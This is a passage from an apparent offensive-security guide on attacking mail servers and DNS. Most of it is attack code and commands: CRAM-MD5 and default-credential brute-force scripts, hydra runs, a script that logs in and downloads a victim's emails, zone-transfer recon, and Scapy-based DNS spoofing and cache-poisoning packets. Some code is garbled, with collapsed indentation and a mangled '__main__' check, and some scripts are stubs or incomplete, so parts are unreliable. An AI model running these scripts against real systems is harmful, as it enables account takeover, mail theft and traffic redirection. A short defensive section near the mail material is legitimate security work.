        # CRAM-MD5: HMAC-MD5(password, challenge)
        response_bytes = hmac.new(
            password.encode(),
            challenge.encode(),
            hashlib.md5
        ).digest()
        
        # Format: username space hex(response)
        response_hex = response_bytes.hex()
        return f"{username} {response_hex}"
    
    def test_credentials(self, username, password):
        """Test CRAM-MD5 credentials"""
        sock, challenge = self.connect_and_get_challenge()
        
        if not sock or not challenge:
            return False
        
        try:
            response = self.compute_cram_response(username, password, challenge)
            response_b64 = base64.b64encode(response.encode()).decode()
            
            sock.send(f'{response_b64}\r\n'.encode())
            server_response = sock.recv(1024).decode('utf-8', errors='ignore')
            
            print(f"[*] Server response: {server_response.strip()}")
            
            if '+OK' in server_response or 'OK' in server_response.upper():
                print(f"[+] SUCCESS: {username}:{password}")
                return True
        except Exception as e:
            print(f"[-] Error: {e}")
        finally:
            sock.close()
        
        return False
    
    def dictionary_attack(self, usernames, passwords):
        """CRAM-MD5 dictionary attack"""
        for username in usernames:
            for password in passwords:
                print(f"[*] Trying: {username}:{password}")
                if self.test_credentials(username, password):
                    print(f"[+] Found valid credentials: {username}:{password}")
                    return True
        
        return False

# Usage
if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "target.com"
    
    users = ["admin", "user", "test"]
    passwords = ["password", "123456", "admin"]
    
    exploit = CRAMMD5Exploit(target, port=110)
    exploit.dictionary_attack(users, passwords)
```

#### MD5 Rainbow Table Attack

[Inference] MD5 hashes from CRAM-MD5 can potentially be pre-computed in rainbow tables due to MD5 weaknesses, though this requires specific challenge knowledge.

```bash
# MD5 rainbow table resources
# https://md5online.com
# https://crackstation.net
# https://hashkiller.co.uk

# Generate MD5 hashes for common password+challenge combinations
python3 << 'EOF'
import hashlib
import hmac

def generate_cram_hashes(challenge, passwords):
    """Generate CRAM-MD5 hashes for password list"""
    hashes = {}
    
    for password in passwords:
        # HMAC-MD5(password, challenge)
        response = hmac.new(
            password.encode(),
            challenge.encode(),
            hashlib.md5
        ).hexdigest()
        
        hashes[response] = password
    
    return hashes

challenge = "<12345.example.com>"
passwords = ["password", "123456", "admin", "letmein"]

hashes = generate_cram_hashes(challenge, passwords)
for hash_val, password in hashes.items():
    print(f"{hash_val}:{password}")
EOF

# Lookup computed hashes
curl "https://md5online.com/api/md5/hash_value" 2>/dev/null
```

#### CRAM-MD5 Challenge Replay

Exploit weak challenge generation:

```python
#!/usr/bin/env python3
import socket
import base64
import time

class CRAMReplay:
    def __init__(self, target, port=110):
        self.target = target
        self.port = port
        self.captured_challenges = []
    
    def capture_challenge(self):
        """Capture CRAM-MD5 challenge from server"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target, self.port))
            
            sock.recv(1024)  # Banner
            sock.send(b'AUTH CRAM-MD5\r\n')
            
            response = sock.recv(1024).decode('utf-8', errors='ignore')
            if response.startswith('+'):
                challenge_b64 = response[2:].strip()
                challenge = base64.b64decode(challenge_b64).decode('utf-8', errors='ignore')
                self.captured_challenges.append(challenge)
                print(f"[+] Captured challenge: {challenge}")
                return challenge
        except Exception as e:
            print(f"[-] Error: {e}")
        finally:
            try:
                sock.close()
            except:
                pass
        
        return None
    
    def check_challenge_uniqueness(self):
        """Check if challenges are unique (poor randomness)"""
        print(f"[*] Captured {len(self.captured_challenges)} challenges")
        
        unique_challenges = set(self.captured_challenges)
        print(f"[*] Unique challenges: {len(unique_challenges)}")
        
        if len(unique_challenges) < len(self.captured_challenges):
            print("[!] WEAKNESS: Challenges are not unique!")
            print("[!] Server may reuse challenges (replay attack possible)")
            return False
        
        return True

# Usage
replay = CRAMReplay("target.com", port=110)

# Capture multiple challenges
for i in range(10):
    replay.capture_challenge()
    time.sleep(0.5)

replay.check_challenge_uniqueness()
```

### Default Credentials

Many mail servers and applications ship with default credentials. Testing for defaults enables easy compromise.

#### Common Default Credentials

Known default credentials for email services:

```
Service                 Username        Password
─────────────────────────────────────────────────
Dovecot                 root            (varies)
Cyrus IMAP              admin           admin
Postfix                 postfix         (none)
MailServer (generic)    admin           admin
Exchange                Administrator   (varies)
Zimbra                  admin           (varies)
SendMail                root            (varies)
Gmail (test)            test@gmail.com  password
Outlook                 admin           password
```

#### Testing Default Credentials

Systematically test known defaults:

```bash
# Create default credentials wordlist
cat > defaults.txt << 'EOF'
admin:admin
admin:password
admin:123456
root:root
root:password
guest:guest
guest:password
postmaster:postmaster
postmaster:password
test:test
test:password
user:user
user:password
EOF

# Test against POP3
hydra -L defaults.txt pop3://target.com -t 1

# Test against IMAP
hydra -L defaults.txt imap://target.com -t 1

# Manual testing
telnet target.com 110
# USER admin
# PASS admin
```

#### Vendor-Specific Defaults

Test manufacturer defaults:

```bash
# Dovecot Mail Server
# Often runs with test accounts
telnet target.com 110
# USER testuser
# PASS testuser

# Cyrus IMAP
# Default admin account
telnet target.com 143
# A001 LOGIN admin admin

# Zimbra Mail Server
# Common default
# admin@localhost.localdomain:admin

# Postfix/Mail Stack
# Often no default, but may accept root
# USER root
# PASS (no password)

# Test for accounts without passwords
for user in root admin postmaster mail; do
  timeout 5 nc target.com 110 << EOF
USER $user
PASS
QUIT
EOF
done
```

#### Credential Database Testing

Build comprehensive default credential lists:

```python
#!/usr/bin/env python3
import socket
import sys
import time

class DefaultCredentialTester:
    def __init__(self, target, port=110, protocol='pop3'):
        self.target = target
        self.port = port
        self.protocol = protocol
        self.defaults = [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("admin", ""),
            ("root", "root"),
            ("root", "password"),
            ("root", ""),
            ("guest", "guest"),
            ("guest", ""),
            ("test", "test"),
            ("test", ""),
            ("postmaster", "postmaster"),
            ("postmaster", ""),
            ("user", "user"),
            ("mail", "mail"),
            ("mail", ""),
        ]
    
    def test_pop3(self, username, password):
        """Test POP3 credentials"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target, self.port))
            
            # Banner
            response = sock.recv(1024).decode('utf-8', errors='ignore')
            if not response.startswith('+OK'):
                sock.close()
                return False
            
            # USER
            sock.send(f'USER {username}\r\n'.encode())
            response = sock.recv(1024).decode('utf-8', errors='ignore') if not response.startswith('+OK'): sock.close() return False

        # PASS
        sock.send(f'PASS {password}\r\n'.encode())
        response = sock.recv(1024).decode('utf-8', errors='ignore')
        sock.close()
        
        if response.startswith('+OK'):
            return True
    except:
        pass
    
    return False

def test_imap(self, username, password):
    """Test IMAP credentials"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((self.target, self.port))
        
        # Greeting
        response = sock.recv(1024).decode('utf-8', errors='ignore')
        if 'OK' not in response:
            sock.close()
            return False
        
        # LOGIN
        cmd = f'A001 LOGIN "{username}" "{password}"\r\n'
        sock.send(cmd.encode())
        response = sock.recv(1024).decode('utf-8', errors='ignore')
        sock.close()
        
        if 'OK' in response and 'logged in' in response.lower():
            return True
    except:
        pass
    
    return False

def test_all_defaults(self):
    """Test all default credentials"""
    print(f"[*] Testing default credentials on {self.target}:{self.port} ({self.protocol.upper()})")
    
    successful = []
    
    for username, password in self.defaults:
        # Display
        if password:
            print(f"[*] Trying: {username}:{password}", end="", flush=True)
        else:
            print(f"[*] Trying: {username}:(no password)", end="", flush=True)
        
        # Test
        if self.protocol == 'pop3':
            success = self.test_pop3(username, password)
        elif self.protocol == 'imap':
            success = self.test_imap(username, password)
        else:
            success = False
        
        if success:
            print(f" [+] SUCCESS")
            successful.append((username, password))
        else:
            print()
        
        time.sleep(0.5)  # Rate limiting
    
    if successful:
        print(f"\n[+] Found {len(successful)} default credentials:")
        for username, password in successful:
            if password:
                print(f"    {username}:{password}")
            else:
                print(f"    {username}:(no password)")
    else:
        print("\n[-] No default credentials found")
    
    return successful

# Usage

if **name** == "**main**": target = sys.argv[1] if len(sys.argv) > 1 else "target.com"
# Test POP3
pop3_tester = DefaultCredentialTester(target, port=110, protocol='pop3')
pop3_tester.test_all_defaults()

# Test IMAP
imap_tester = DefaultCredentialTester(target, port=143, protocol='imap')
imap_tester.test_all_defaults()
```

#### Vendor Documentation Analysis

Extract defaults from public sources:

```bash
# Search for default credentials in documentation
# POP3/IMAP server documentation URLs:
# mail.example.com/admin -> admin panel documentation
# /help, /docs, /documentation -> May contain defaults

# Common documentation paths
for path in /docs /documentation /help /admin /info /readme.txt /default.txt; do
  curl -s "http://target.com$path" | grep -iE "default|password|credential|admin" | head -5
done

# Search GitHub for hardcoded defaults
# github.com search: "mail.example.com" "admin:admin"

# Check application source code (if accessible)
grep -r "USER\|PASS\|admin" source_code/ | grep -iE "default|test|dummy"
````

#### Automated Default Testing Framework

Comprehensive default credential assessment:

```python
#!/usr/bin/env python3
import socket
import sys
import time
from threading import Thread, Lock
from queue import Queue

class ComprehensiveDefaultTester:
    def __init__(self, target, protocols=['pop3', 'imap'], threads=8):
        self.target = target
        self.protocols = protocols
        self.threads = threads
        self.lock = Lock()
        self.found_credentials = {}
        
        # Extended default credentials
        self.defaults = self._build_defaults()
    
    def _build_defaults(self):
        """Build comprehensive default credential list"""
        defaults = [
            # Standard defaults
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("admin", ""),
            
            # Root variants
            ("root", "root"),
            ("root", "password"),
            ("root", "toor"),
            ("root", ""),
            
            # Service accounts
            ("mail", "mail"),
            ("mail", "password"),
            ("mail", ""),
            ("postmaster", "postmaster"),
            ("postmaster", "password"),
            ("postmaster", ""),
            
            # Test accounts
            ("test", "test"),
            ("test", "password"),
            ("test", ""),
            ("guest", "guest"),
            ("guest", "password"),
            ("guest", ""),
            
            # Vendor-specific
            ("administrator", "administrator"),
            ("administrator", "password"),
            ("user", "user"),
            ("user", "password"),
        ]
        
        return defaults
    
    def test_pop3(self, username, password):
        """Test POP3 credentials"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target, 110))
            
            sock.recv(1024)  # Banner
            sock.send(f'USER {username}\r\n'.encode())
            
            if not sock.recv(1024).startswith(b'+OK'):
                sock.close()
                return False
            
            sock.send(f'PASS {password}\r\n'.encode())
            response = sock.recv(1024)
            sock.close()
            
            return response.startswith(b'+OK')
        except:
            return False
    
    def test_imap(self, username, password):
        """Test IMAP credentials"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target, 143))
            
            sock.recv(1024)  # Greeting
            cmd = f'A001 LOGIN "{username}" "{password}"\r\n'
            sock.send(cmd.encode())
            response = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            
            return 'OK' in response
        except:
            return False
    
    def worker(self, queue):
        """Worker thread for credential testing"""
        while True:
            try:
                protocol, username, password = queue.get(timeout=1)
            except:
                break
            
            if protocol == 'pop3':
                success = self.test_pop3(username, password)
            elif protocol == 'imap':
                success = self.test_imap(username, password)
            else:
                success = False
            
            if success:
                with self.lock:
                    key = f"{protocol}:{username}"
                    self.found_credentials[key] = password
                    print(f"\n[+] {protocol.upper()} {username}:{password if password else '(no password)'}")
    
    def test_all(self):
        """Test all protocols and credentials"""
        print(f"[*] Testing {len(self.protocols)} protocols with {len(self.defaults)} default credentials")
        
        queue = Queue()
        
        # Populate queue
        for protocol in self.protocols:
            for username, password in self.defaults:
                queue.put((protocol, username, password))
        
        # Start workers
        worker_threads = []
        for _ in range(self.threads):
            t = Thread(target=self.worker, args=(queue,))
            t.start()
            worker_threads.append(t)
        
        # Wait for completion
        for t in worker_threads:
            t.join()
        
        # Report
        if self.found_credentials:
            print(f"\n[+] Found {len(self.found_credentials)} valid default credentials:")
            for key, password in self.found_credentials.items():
                print(f"    {key}: {password if password else '(no password)'}")
        else:
            print("\n[-] No default credentials found")
        
        return self.found_credentials

# Usage
if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "target.com"
    
    tester = ComprehensiveDefaultTester(target, protocols=['pop3', 'imap'], threads=8)
    tester.test_all()
```

#### Post-Compromise Actions

Upon successful default credential access:

```bash
# List mailboxes (POP3)
telnet target.com 110
# USER admin
# PASS admin
# LIST
# RETR message_number

# List mailboxes (IMAP)
telnet target.com 143
# A001 LOGIN admin admin
# A002 LIST "" "*"
# A003 SELECT INBOX
# A004 FETCH 1:* BODY[]

# Download emails for analysis
python3 << 'EOF'
import imaplib

def download_emails(host, username, password):
    """Download all emails from account"""
    try:
        mail = imaplib.IMAP4(host)
        mail.login(username, password)
        
        # List mailboxes
        status, mailboxes = mail.list()
        print(f"[+] Mailboxes:")
        for mailbox in mailboxes:
            print(f"  {mailbox}")
        
        # Select INBOX
        mail.select("INBOX")
        status, emails = mail.search(None, "ALL")
        
        for email_id in emails[0].split():
            status, msg_data = mail.fetch(email_id, "(RFC822)")
            print(f"\n[*] Email {email_id}:")
            print(msg_data[0][1].decode('utf-8', errors='ignore')[:500])
        
        mail.close()
        mail.logout()
    except Exception as e:
        print(f"[-] Error: {e}")

download_emails("target.com", "admin", "admin")
EOF

# Extract credentials and sensitive data from emails
# Look for: password resets, account information, API keys, etc.

# Pivot to other systems using email contents
# Search for: internal IP addresses, hostnames, domain information
```

#### Default Credential Prevention

Detection and remediation guidance:

```bash
# Detect systems using default credentials
nmap -p 110,143 --script pop3-brute,imap-brute target.com

# Force credential change on first login
# Mail server configuration

# Implement account lockout policies
# After N failed attempts, lock account for X minutes

# Enable authentication logging
# Monitor for successful default credential use

# Audit logging
grep "admin.*admin\|root.*root" /var/log/mail.log
grep "authentication" /var/log/auth.log

# Change default credentials immediately after deployment
#!/bin/bash
# Script to rotate default credentials
for user in admin postmaster test; do
  echo "Changing password for $user"
  doveadm user modify "$user@domain.com" password=$(openssl rand -base64 16)
done

# Implement password policy
# Minimum length: 16 characters
# Complexity: Upper, lower, digit, special character
# Expiration: 90 days
# History: Prevent reuse of last 5 passwords
```

This comprehensive guide covers POP3/IMAP brute force attacks, cleartext credential capture through network interception, CRAM-MD5 authentication weaknesses, and default credential exploitation. Each technique includes practical implementation examples, detection methods, and security recommendations applicable to email security assessments and incident response scenarios.

---

## DNS Exploitation

### Zone Transfer Exploitation

DNS zone transfers retrieve entire DNS zone data from authoritative nameservers. While intended only for legitimate secondary nameservers, misconfigured servers allow unauthorized transfers, exposing all DNS records and infrastructure.

#### DNS Zone Transfer Basics

Zone transfers use two mechanisms:

**AXFR (Full Zone Transfer):**

```bash
# Request entire zone data
dig @nameserver.target.com target.com AXFR

# Expected response (if misconfigured):
# ; <<>> DiG 9.x.x <<>> @ns1.target.com target.com AXFR
# target.com.        3600  IN  SOA   ns1.target.com. admin.target.com.
# target.com.        3600  IN  NS    ns1.target.com.
# target.com.        3600  IN  NS    ns2.target.com.
# www.target.com.    3600  IN  A     192.168.1.100
# mail.target.com.   3600  IN  A     192.168.1.101
# api.target.com.    3600  IN  A     192.168.1.102
# db.target.com.     3600  IN  A     10.0.0.50
# admin.target.com.  3600  IN  A     10.0.0.51
```

**IXFR (Incremental Zone Transfer):**

```bash
# Request zone changes since specific serial number
dig @nameserver.target.com target.com IXFR=2023010101

# Returns only records changed since serial 2023010101
# Smaller than AXFR but still reveals modifications
```

#### Identifying Nameservers

```bash
# Query NS records for target domain
nslookup -type=NS target.com
# Or
dig target.com NS

# Output:
# target.com  nameserver = ns1.target.com.
# target.com  nameserver = ns2.target.com.
# target.com  nameserver = ns3.provider.com.

# Identify all nameservers before attempting transfer
```

#### Zone Transfer Execution

**Using dig:**

```bash
# Attempt AXFR against primary nameserver
dig @ns1.target.com target.com AXFR

# Attempt against secondary
dig @ns2.target.com target.com AXFR

# Attempt against ISP nameserver (often misconfigured)
dig @ns.isp.com target.com AXFR
```

**Using nslookup:**

```bash
# Interactive mode
nslookup
> server ns1.target.com
> set type=AXFR
> target.com
> exit

# Batch mode
nslookup -type=AXFR target.com ns1.target.com
```

**Using host command:**

```bash
# Attempt zone transfer
host -l target.com ns1.target.com

# -l flag enables zone listing
# Output displays all records if successful
```

#### Automated Zone Transfer Scanning

**Using fierce (DNS enumeration tool):**

```bash
# Comprehensive zone transfer and subdomain discovery
fierce --domain target.com

# Output includes:
# - Zone transfer if possible
# - Discovered subdomains
# - IP ranges
# - Mail servers
# - Nameserver details
```

**Using dnsenum:**

```bash
# Zone transfer attempt + subdomain brute force
dnsenum target.com

# Options
dnsenum --noreverse --enum target.com
# --noreverse: skip reverse DNS lookups (faster)
# --enum: attempt zone transfer

# Outputs DNS tree structure if transfer succeeds
```

**Using zonetransfer.me (test domain):**

```bash
# Known vulnerable test domain
dig @nsztm1.zonetransfer.me zonetransfer.me AXFR

# Common learning/testing domain
# Demonstrates zone transfer vulnerability
```

#### Exploitation via ACL Misconfiguration

Even if nameserver restricts transfers, misconfigurations may allow:

```bash
# ACL based on source IP
# Attacker spoofs allowed IP range (if possible)

# ACL based on TSIG (DNS security)
# Weak TSIG keys vulnerable to brute force

# Check TSIG configuration
dig @ns1.target.com target.com AXFR +dnssec

# TSIG-Sig0 alternative (no shared key)
# Exploitable if improperly implemented
```

#### Information Extracted from Zone Transfers

**Infrastructure mapping:**

```
From zone transfer data:
- All hostnames and subdomains
- Internal IP addresses
- Server purposes (mail, database, admin, etc.)
- Network topology
- Backup servers and redundancy setup
```

**Example extracted data:**

```
ns1.target.com          A    192.168.1.10
ns2.target.com          A    192.168.1.11
www.target.com          A    203.0.113.50
mail.target.com         A    203.0.113.51
mail2.target.com        A    203.0.113.52
db.target.com           A    10.0.0.100        (internal only)
db2.target.com          A    10.0.0.101        (internal only)
admin.target.com        A    10.0.0.200        (internal only)
vpn.target.com          A    203.0.113.60
backup.target.com       A    10.0.0.150        (internal backup)
ftp.target.com          A    10.0.0.120        (FTP server)
dev.target.com          A    10.0.0.180        (development)
test.target.com         A    10.0.0.190        (testing)
```

**Service discovery:**

```
MX records reveal mail infrastructure:
- Mail servers for phishing targets
- Secondary mail servers (backup targets)

SRV records reveal service locations:
_ldap._tcp.target.com SRV 0 0 389 ldap.target.com
_kerberos._tcp.target.com SRV 0 0 88 dc.target.com

CNAME records reveal aliases:
shop.target.com CNAME ecommerce.target.com
api.target.com CNAME api-gw.target.com
```

#### Post-Zone Transfer Exploitation

**Network reconnaissance:**

```bash
# Extract IPs from zone transfer
dig @ns1.target.com target.com AXFR | grep "IN A" | awk '{print $NF}' | sort -u

# Scan discovered hosts
nmap -p 22,80,443,3306,5432 <discovered_ips>

# Identify running services on each host
```

**Subdomain targeting:**

```bash
# Focus on interesting subdomains discovered
# admin.target.com - likely administrative interface
# db.target.com - database server
# backup.target.com - potential data repository
# dev.target.com - development environment (often less secured)

# Prioritize for exploitation
```

**Lateral movement planning:**

```bash
# Internal IPs (10.x.x.x, 172.16.x.x) indicate internal services
# Plan attacks from compromised external host to these internal systems
# Use pivot chains through exposed servers
```

### DNS Poisoning

DNS poisoning (spoofing) injects false DNS responses to redirect users to attacker-controlled systems.

#### DNS Poisoning Attack Types

**Local DNS poisoning (hosts file modification):**

```bash
# Attacker modifies local hosts file
# Redirects domain names to attacker IP

# Windows: C:\Windows\System32\drivers\etc\hosts
# Linux/Mac: /etc/hosts

# Example entry
192.168.1.100 target.com
192.168.1.100 www.target.com
192.168.1.100 mail.target.com

# All connections to target.com resolve to 192.168.1.100 locally
# Requires local access (employee compromise, supply chain)
```

**DNS spoofing via MITM (Ettercap/dsniff):**

```bash
# ARP spoofing for MITM position
arpspoof -i eth0 -t victim.com gateway.com

# dnspoof to inject false DNS responses
dnsspoof -i eth0 -f dns_hosts.txt

# dns_hosts.txt format:
# target.com          A    192.168.1.100
# www.target.com      A    192.168.1.100
# mail.target.com     A    192.168.1.100

# All DNS queries from victim.com redirect to attacker addresses
```

**Ettercap DNS spoofing:**

```bash
# Launch Ettercap with DNS spoofing plugin
ettercap -G

# Configure:
# 1. Set sniffing interface
# 2. Select targets (victim IP)
# 3. Activate ARP spoofing
# 4. Activate DNS spoofing plugin
# 5. Configure etter.dns with target mappings

# etter.dns format:
# *   A   192.168.1.100
# target.com   A   192.168.1.100
# www.target.com   A   192.168.1.100

# Run: ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /target_ip/ /gateway_ip/
```

#### DNS Response Poisoning

**Intra-query attack (pollute cache during legitimate query):**

```bash
# Attacker sends multiple spoofed responses
# Legitimate nameserver accepts first matching response

# Requires timing and network position
# Scapy for crafting DNS responses:

python3 << 'EOF'
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR
import random

# Craft DNS response packet
def create_dns_response(domain, attacker_ip, target_dns_ip):
    # DNS response with false A record
    dns_response = IP(dst=target_dns_ip) / \
                   UDP(sport=53, dport=random.randint(1024, 65535)) / \
                   DNS(id=random.randint(0, 65535), 
                       qr=1,  # Response
                       aa=0,  # Not authoritative
                       rd=1,
                       ra=1,
                       qdcount=1,
                       ancount=1,
                       qd=DNSQR(qname=domain),
                       an=DNSRR(rrname=domain, type="A", rdata=attacker_ip))
    
    return dns_response

# Send multiple responses rapidly
for i in range(100):
    pkt = create_dns_response("target.com", "192.168.1.100", "8.8.8.8")
    send(pkt, verbose=False)

print("DNS poisoning responses sent")
EOF
```

#### DNS Cache Poisoning Prevention Bypass

**Kaminsky attack vulnerability (fixed in modern DNS):**

```bash
# [Unverified] Original Kaminsky attack (CVE-2008-1447)
# Exploits predictable DNS transaction IDs and ports

# Attacker sends many spoofed responses with varying IDs
# One matches legitimate query, poisoning cache
# Additional records in "Authority" section also cached

# Modern defenses:
# - Randomized transaction IDs
# - Randomized source ports
# - Query rate limiting

# Bypass requires:
# - Older unpatched nameservers
# - Predictable ID/port generation
# - Close network proximity to nameserver
```

**NSEC walking for DNSSEC bypass:**

```bash
# DNSSEC provides signing, not privacy
# NSEC records reveal all domain names in zone

# Query NSEC records
dig @ns1.target.com target.com NSEC

# NSEC records show:
# a.target.com NSEC b.target.com
# b.target.com NSEC c.target.com
# (reveals domain structure through NSEC chain)

# Walk entire zone with NSEC3 hash function cracking
# Hash function invertible with wordlist matching
```

### DNS Cache Poisoning

DNS cache poisoning exploits vulnerabilities in recursive resolvers to inject false records into cached responses.

#### Cache Poisoning Attack Mechanics

**Resolver behavior:**

```bash
# Victim issues query
dig @resolver.isp.com target.com A

# ISP resolver queries authoritative nameserver
# Meanwhile, attacker sends spoofed responses to resolver

# If spoofed response arrives before legitimate one:
# Resolver caches false record
# All users of resolver receive poisoned response
```

**Large-scale impact:**

```bash
# Single cache poisoning affects all resolver users
# ISP resolvers often serve thousands of customers
# Attacker redirects entire user base to malicious site
```

#### Transaction ID Randomization Bypass

**Predictable ID exploitation:**

```bash
# Some DNS implementations generate predictable IDs
# Attacker observes IDs, predicts next value

# Monitor legitimate queries
tcpdump -i eth0 port 53

# Extract transaction IDs
# Analyze pattern (sequential, time-based, etc.)
# Predict next ID for spoofed response

# Send spoofed response with predicted ID
# High success rate if IDs truly predictable

# Scapy exploit
python3 << 'EOF'
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send
import socket
import time

def predict_next_dns_id(observed_ids):
    # Simple prediction: sequential
    return (observed_ids[-1] + 1) % 65536

def poison_cache(resolver_ip, domain, attacker_ip, observed_ids):
    next_id = predict_next_dns_id(observed_ids)
    
    # Craft poisoned response
    response = IP(dst=resolver_ip) / \
               UDP(sport=53, dport=53) / \
               DNS(id=next_id, qr=1, rd=1, ra=1, 
                   qd=DNSQR(qname=domain),
                   an=DNSRR(rrname=domain, type="A", rdata=attacker_ip))
    
    # Send before legitimate response
    send(response, verbose=False)
    print(f"Poisoned cache with ID {next_id}")

# Typical usage in MITM scenario
EOF
```

#### UDP Source Port Randomization Bypass

**Fixed port exploitation:**

```bash
# Older resolvers query from fixed port 53
# Attacker must match predictable source port

# Modern resolvers randomize source port
# Attacker must guess from 65536 possibilities
# Significantly harder exploitation

# Check resolver implementation
dig +short target.com @resolver.isp.com

# If source port predictable: vulnerable
# Modern resolvers: 65536x more difficult
```

#### Bailiwick Checking Bypass

**Authority section poisoning:**

```bash
# DNS response includes Authority section with additional records
# Some resolvers cache these without verification (bailiwick check)

# Attacker includes poisoned records in Authority section
# Resolver caches unverified records

# Example poisoned response:
# ANSWER SECTION:
# target.com  IN  A  203.0.113.50  (legitimate)
#
# AUTHORITY SECTION:
# admin.internal.company.com  IN  A  192.168.1.100  (poisoned!)

# Resolver caches admin.internal.company.com if bailiwick check weak
```

**CNAME chaining for cache poisoning:**

```bash
# Attacker controls victim.target.com
# Responds with CNAME pointing to internal.company.com

# Resolver follows CNAME chain without proper validation
# Caches false association between domains

# dig shows CNAME chain
dig victim.target.com

# Response:
# victim.target.com CNAME attacker-controlled-domain.com
# attacker-controlled-domain.com A 192.168.1.100
```

#### Cache Poisoning Exploitation Workflow

**Stage 1: Reconnaissance**

```bash
# Identify target resolver
nslookup -type=NS target.com

# Discover ISP resolvers
# Query SOA to identify primary nameserver

# Analyze resolver behavior
# Determine transaction ID randomness
# Check port randomization
```

**Stage 2: Preparation**

```bash
# Generate poisoned DNS response
# Prepare MITM infrastructure (ARP spoofing, etc.)

# Calculate timing for response injection
# Must arrive before legitimate authoritative response
```

**Stage 3: Exploitation**

```bash
# Trigger query from resolver to target domain
# Attacker on network path injects poisoned response

# Resolver caches false record
# All users affected until TTL expires
```

**Stage 4: Verification**

```bash
# Query resolver for poisoned domain
dig @poisoned-resolver.com target.com

# Verify cache contains attacker's IP
# Calculate time until cache expiration
```

#### Cache Poisoning Impact

```bash
# Phishing attacks
# Victims redirected to attacker site mimicking legitimate service
# Harvest credentials, credentials

# Malware distribution
# Users downloading infected software from redirected site

# C2 communication
# Compromised systems unable to reach legitimate C2
# Redirected to attacker's C2

# Service disruption
# DDoS through redirect amplification
# Users attempting to reach service directed away
```

### DNSSEC Bypass

DNSSEC provides cryptographic verification of DNS records but contains implementation vulnerabilities allowing bypass.

#### DNSSEC Basics

**DNSSEC chain of trust:**

```bash
# Root zone → TLD zone → Authoritative zone
# Each signs records for zone below
# DS (Delegation Signer) record links zones

# Verify DNSSEC chain
dig +dnssec target.com

# Output includes:
# RRSIG (signature record)
# DS (delegation signer)
# DNSKEY (public key for verification)
```

**DNSSEC validation process:**

```bash
# Resolver receives response
# Extracts RRSIG (signature)
# Retrieves DNSKEY from zone
# Verifies signature cryptographically
# If valid: record trusted
# If invalid: response rejected
```

#### DNSSEC Validation Bypass

**Unsigned zone exploitation:**

```bash
# Some zones not fully DNSSEC signed
# Unsigned records vulnerable to poisoning

# Check for unsigned records
dig @ns1.target.com target.com +dnssec

# If response shows "ad" flag missing, validation failed
# Or records lack RRSIG = unsigned

# Poison unsigned records normally
# DNSSEC doesn't protect them
```

**Signature expiration exploitation:**

```bash
# DNSSEC signatures have expiration times
# After expiration, records unverified

# Check signature validity
dig @ns1.target.com target.com +dnssec

# Look for signature expiration date
# If expired, record vulnerable

# [Unverified] Replay old signatures after expiration
# Attacker caches expired signature
# Re-presents after real signature expires
```

**Algorithm downgrade attack:**

```bash
# DNSSEC supports multiple signing algorithms
# Attacker forces use of weaker algorithm

# DNSKEY lists supported algorithms
# Attacker removes strong algorithms from response
# Resolver forced to use weak algorithm (if weak options present)

# Scapy downgrade attempt
python3 << 'EOF'
from scapy.all import IP, UDP, DNS, DNSRR

# Craft DNSKEY response with only weak algorithms
# Force resolver to use weaker crypto

# Example: Remove RSASHA256, force RSASHA1
# Or force use of deprecated algorithms
EOF
```

**NSEC/NSEC3 enumeration for cache poisoning:**

```bash
# DNSSEC NSEC records prove non-existence
# But reveal all domains in zone (zone walking)

# NSEC3 hashes domain names to prevent walking
# But hash function invertible with wordlist

# Crack NSEC3 hashes
python3 << 'EOF'
import hashlib

# NSEC3 hash function
def nsec3_hash(domain, iterations, salt):
    data = domain.encode()
    for _ in range(iterations):
        data = hashlib.sha1(data + salt).digest()
    return data.hex()

# Wordlist attack
wordlist = ["admin", "mail", "www", "db", "api"]
salt = bytes.fromhex("0123456789ABCDEF")
iterations = 50

for word in wordlist:
    hash_val = nsec3_hash(word + ".target.com", iterations, salt)
    print(f"{word}.target.com -> {hash_val}")
    
# Compare against NSEC3 hashes from zone transfer
# Cracked hashes reveal domain names
EOF
```

#### [Unverified] DNSSEC Stripping Attack

**Remove DNSSEC validation requirement:**

```bash
# Attacker intercepts DNSSEC queries
# Removes DNSSEC records from response
# Removes signatures (RRSIG)
# Responds with unsigned records

# Resolver accepts unsigned response
# If resolver not enforcing DNSSEC validation

# Requires MITM position between resolver and authoritative nameserver
```

#### DNSSEC Denial of Existence Bypass

**Synthesize records within proven empty space:**

```bash
# NSEC records prove existence gaps
# NSEC: a.target.com to c.target.com
# Proves b.target.com doesn't exist

# Attacker injects record between a and c (e.g., b2.target.com)
# Record falls within NSEC range
# Spoofed record appears valid per DNSSEC rules

# [Inference] Requires understanding NSEC gaps
# Inject in unexplored space between proven names
```

### DNS Amplification for DDoS

DNS amplification attacks use DNS servers to generate large responses, flooding targets with traffic.

#### DNS Amplification Mechanism

**Query/response ratio:**

```bash
# Small query generates large response
# Attacker sends query with spoofed source IP (victim's IP)
# DNS server responds with large data to victim

# Typical ratios:
# Query: 60 bytes
# Response: 3000+ bytes
# Amplification: 50x+ traffic increase

# Example query
dig @ns1.target.com target.com +dnssec +any

# Response includes:
# - A records
# - AAAA records (IPv6)
# - MX records
# - NS records
# - TXT records
# - SOA record
# - RRSIG signatures (large)
# - DNSKEY records
# Total: 2000-5000 bytes
```

#### Public DNS Server Identification

Attackers identify public recursive resolvers allowing queries from any source:

```bash
# Test if resolver responds to external queries
dig @8.8.8.8 google.com +short

# If responds, resolver public and potentially exploitable

# Scan for public resolvers
nmap -sU -p 53 --script dns-recursion 203.0.113.0/24

# NSE script identifies recursive resolvers
# Output:
# 203.0.113.1 53/udp - Recursion allowed

